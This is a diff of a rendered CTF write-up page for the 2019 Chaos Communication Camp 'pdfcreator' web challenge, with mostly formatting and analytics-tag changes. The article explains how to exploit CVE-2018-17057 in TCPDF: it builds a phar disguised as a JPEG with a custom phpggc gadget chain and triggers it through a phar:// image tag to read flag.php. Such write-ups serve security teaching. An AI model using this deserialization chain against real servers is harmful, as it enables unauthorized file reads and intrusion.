@@ -18,18 +18,18 @@
   
   
   <title>[Web] Chaos Communication Camp 2019 CTF - pdfcreator | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Description:116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip  IntroductionA website that converts editable content into a pdf, it uses a known tool">
+  <meta name="description" content="Description: 116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip   Introduction A website that converts editable content into a pdf, it uses a known t">
 <meta name="keywords" content="ccc2019ctf,unserialization,php">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Web] Chaos Communication Camp 2019 CTF - pdfcreator">
 <meta property="og:url" content="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Description:116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip  IntroductionA website that converts editable content into a pdf, it uses a known tool">
+<meta property="og:description" content="Description: 116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip   Introduction A website that converts editable content into a pdf, it uses a known t">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2022-08-23T00:14:55.169Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Web] Chaos Communication Camp 2019 CTF - pdfcreator">
-<meta name="twitter:description" content="Description:116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip  IntroductionA website that converts editable content into a pdf, it uses a known tool">
+<meta name="twitter:description" content="Description: 116 Written by: 0x4d5a A pdf conversion service. What could go wrong? hax.allesctf.net:3333 code.zip   Introduction A website that converts editable content into a pdf, it uses a known t">
   <!-- Canonical links -->
   <link rel="canonical" href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/index.html">
   
@@ -352,13 +352,15 @@
     <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
-<p><strong>Description</strong>:<br>116</p>
+<p><strong>Description</strong>:<br>
+116</p>
 <p>Written by: 0x4d5a</p>
 <p>A pdf conversion service. What could go wrong?</p>
-<p>hax.allesctf.net:3333</p>
+<p><a href="http://hax.allesctf.net:3333" target="_blank" rel="noopener">hax.allesctf.net:3333</a></p>
 <p><a href="https://mega.nz/#!Gm4GjSxT!w31l60yP_l3EcW7osHu6CfGcTttqhFDt8BgJuAJUP78" target="_blank" rel="noopener">code.zip</a></p>
 </blockquote>
-<h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>A website that converts editable content into a pdf, it uses a known tool named tcpdf , since the source code is given lets check its version at <strong>TCPDF/tcpdf.php</strong></p>
+<h3 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h3>
+<p>A website that converts editable content into a pdf, it uses a known tool named tcpdf , since the source code is given lets check its version at <strong>TCPDF/tcpdf.php</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cat pdfcreator/TCPDF/tcpdf.php | head -10</span><br><span class="line">&lt;?php</span><br><span class="line">//============================================================+</span><br><span class="line">// File name   : tcpdf.php</span><br><span class="line">// Version     : 6.2.13</span><br><span class="line">// Begin       : 2002-08-03</span><br><span class="line">// Last Update : 2015-06-18</span><br><span class="line">// Author      : Nicola Asuni - Tecnick.com LTD - www.tecnick.com - info@tecnick.com</span><br><span class="line">// License     : GNU-LGPL v3 (http://www.gnu.org/copyleft/lesser.html)</span><br><span class="line">// -------------------------------------------------------------------</span><br><span class="line">// Copyright (C) 2002-2015 Nicola Asuni - Tecnick.com LTD</span><br></pre></td></tr></table></figure>
 <p>The version is <strong>6.2.13</strong> searching online for known vulnerabilities <a href="https://www.cvedetails.com/cve/CVE-2018-17057/" target="_blank" rel="noopener">https://www.cvedetails.com/cve/CVE-2018-17057/</a> :</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">An issue was discovered in TCPDF before 6.2.22. </span><br><span class="line">Attackers can trigger unserialization of arbitrary data via the phar:// wrapper.</span><br></pre></td></tr></table></figure>
@@ -369,14 +371,16 @@
 <p>This checks can be easily bypassed, the first check can easily bypassed by changing filename from exploit.phar to exploit.jpg.</p>
 <p>The second check only checks the header we can easily append to our <strong>phar</strong> file a jpg header before our phar file. The objective is to unserialize a php class that can gives us <strong>RCE</strong> or a <strong>fileread</strong> of file flag.php, there is a good class we can use for this:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pdfcreator/creator.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   ...</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">      &#123;</span><br><span class="line">        $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We want to trigger functions like <strong>__construct</strong> or <strong>__destruct</strong> after object deserialization, <strong>__construct</strong> is empty so it’s not useful but <strong>__destruct</strong> is! </p>
-<p>It can give us a <strong>file_read</strong> which is enough for what we need, but for this we need to change tmpfile variable to <strong>./flag.php</strong> making the extesion to be diferent from <strong>pdf</strong> reading the file content instead. </p>
-<p>I tried to manually create the phar file but failed miserly, while debugging locally with I was having some troubles passing through the function <strong>getimagesize</strong> due to some errors on jpg signatures eventually I managed to solve the problem but in the end the <strong>function __destruct</strong> was not triggering and I ended up giving up. </p>
+<h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h3>
+<p>We want to trigger functions like <strong>__construct</strong> or <strong>__destruct</strong> after object deserialization, <strong>__construct</strong> is empty so it’s not useful but <strong>__destruct</strong> is!</p>
+<p>It can give us a <strong>file_read</strong> which is enough for what we need, but for this we need to change tmpfile variable to <strong>./flag.php</strong> making the extesion to be diferent from <strong>pdf</strong> reading the file content instead.</p>
+<p>I tried to manually create the phar file but failed miserly, while debugging locally with I was having some troubles passing through the function <strong>getimagesize</strong> due to some errors on jpg signatures eventually I managed to solve the problem but in the end the <strong>function __destruct</strong> was not triggering and I ended up giving up.</p>
 <p>Eventually I found <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a> which can create for us the fake jpg file with the phar embed on it, we just need to create our own template for this:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/ambionics/phpggc</span><br><span class="line">$ <span class="built_in">cd</span> phpggc</span><br><span class="line">$ mkdir gadgetchains/Alles/ &amp;&amp; mkdir gadgetchains/Alles/FR &amp;&amp; mkdir gadgetchains/Alles/FR/1</span><br><span class="line">$ cp templates/* gadgetchains/Alles/FR/1/*</span><br></pre></td></tr></table></figure>
 <p>Modifying the <strong>chain.php</strong> at <strong>gadgetchains/Alles/FR/1/</strong>:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span> &#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">PDFCreator</span> &#123; <span class="title">public</span> $<span class="title">tmpfile</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GadgetChain</span>\<span class="title">Alles</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">FR1</span> <span class="title">extends</span> \<span class="title">PHPGGC</span>\<span class="title">GadgetChain</span>\<span class="title">FileRead</span> &#123;</span><br><span class="line">        public static $version = '1.00';</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $vector = <span class="string">'__destruct'</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> $author = <span class="string">'teamrocketist'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span><span class="params">(array $parameters)</span> </span>&#123;</span><br><span class="line">            $a = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">            $a-&gt;tmpfile = $parameters[<span class="string">"remote_file"</span>]; <span class="comment">// file to read</span></span><br><span class="line">            <span class="keyword">return</span> $a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Generating the payload with <strong>phpggc</strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg</span><br></pre></td></tr></table></figure></p>
+<p>Generating the payload with <strong>phpggc</strong>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg</span><br></pre></td></tr></table></figure>
 <p>The option -f uses a technique named <a href="https://github.com/ambionics/phpggc#fast-destruct" target="_blank" rel="noopener">fast destructor</a> to make sure the object deserialized triggers <strong>__destruct</strong>, option <strong>-pj</strong> is to create a jpeg-phar from sample <strong>dummy.jpg</strong>(any valid jpg works) the one I used was this <a href="https://mega.nz/#!qnxylKJQ!QjpxDQP2eOkQGxny-SQ977FCrAp5DTjzNFqfihhPCh4" target="_blank" rel="noopener">one</a>, <strong>-o</strong> option is to specify the output of the payload to a file location.</p>
 <p>After uploading the file make sure you modify the img html tag to use phar:// wrappers:</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/708697c63f7eb369319c6523380bdf7a_6.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -478,7 +482,7 @@
 
     <div class="copyright">
     	
-        &copy; 2022 TEAMROCKETIST
+        &copy; 2023 TEAMROCKETIST
         
         
     </div>
@@ -568,15 +572,14 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-    <script defer type="text/javascript">
-(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-9Y11W83X49"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-ga('create', 'UA-104385070-1', 'auto');
-ga('send', 'pageview');
-
+  gtag('config', 'G-9Y11W83X49');
 </script>
 
 
